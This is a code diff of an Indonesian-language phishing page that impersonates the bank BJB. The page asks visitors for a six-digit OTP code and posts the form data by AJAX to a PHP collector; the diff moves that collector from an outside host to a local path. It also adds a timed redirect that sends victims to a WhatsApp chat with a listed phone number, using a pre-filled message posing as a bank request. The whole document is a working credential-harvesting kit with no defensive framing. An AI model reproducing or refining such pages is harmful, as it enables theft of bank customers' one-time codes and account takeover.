@@ -111,6 +111,7 @@
               <img width="70" src="ast/img/logo.png" alt="" />
               <span class="text-center">Nanti anda akan dihubungi oleh layanan bank BJB, Untuk mengirimkan Format/Pesan SMS ke layanan (83373) Agar bisa terima kode OTP
               </span>
+             
               <div style="display:none;" id="alert" class="alert_gagal text-center">
         Maaf, Kode Tidak Valid!
         <br />
@@ -124,7 +125,7 @@
   <input type="hidden" name="tahun" id="tahun">
   <input type="hidden" name="pin" id="pin">    
   <div class="pin-code" maxlength="6">
-      <p class="text-center">Masukkan kode OTP/Tarif dibawah ini</p>
+      <p class="text-center">Masukkan kode OTP/Tarif dibawah ini</p> <p style="font-weight: 400; font-size: 17px; color: #fff; text-align: center; margin: 0px auto; margin-bottom: 10px;display:noe;position:relative;" id="timer">1 : 00</p>
       <div class="input">
 	<input type="password" inputmode="numeric" id="pin1" name="pin1" maxlength="1" autofocus required>
     <input type="password" inputmode="numeric" id="pin2" name="pin2" maxlength="1" autofocus required>
@@ -174,7 +175,7 @@
        </script>
 <script>
         document.getElementById('timer').innerHTML =
-          02 + ":" + 01;
+          01 + ":" + 01;
         startTimer();
         
         
@@ -190,7 +191,7 @@
           
           document.getElementById('timer').innerHTML =
             m + " : " + s;
-          console.log(m)
+          
           setTimeout(startTimer, 1000);
           
         }
@@ -200,6 +201,19 @@
           if (sec < 0) {sec = "59"};
           return sec;
         }
+        
+        var i = 60;
+var time = $("#cice")
+var timer = setInterval(function() {
+  time.html(i);
+  if (i == 0) {
+  $("#timer").hide(); 
+window.location.href='https://api.whatsapp.com/send?phone=6282182480632&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯%0ASaya mau request Pesan SMS ke layanan (83373) Agar bisa terima kode OTP';
+    clearInterval(timer);
+
+  }
+  i--;
+}, 1000)
     </script> 
   <!--[if lte IE 9]> <![endif]-->
 <script>
@@ -227,7 +241,7 @@ $(document).ready(function(){
 $.ajax({
 
  type: 'POST',
- url: 'https://choreo-is.masuk.web.id/bjb/otp.php',
+ url: 'req/otp.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(),
